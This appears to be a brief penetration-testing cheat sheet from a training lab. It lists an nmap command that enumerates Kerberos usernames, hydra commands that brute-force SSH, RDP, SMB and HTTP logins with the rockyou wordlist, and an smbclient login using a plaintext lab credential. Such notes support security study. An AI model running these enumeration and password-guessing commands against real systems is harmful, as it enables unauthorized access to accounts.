- Find Kerberos usernames
`  nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='MEDTECH.COM' `

- SSH/RDP/SMB
` hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt -s 2222 192.168.50.201 ssh/rdp/smb `

` smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234 `

  - HTTP
` hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt 192.168.50.20 http-get /webpage/ `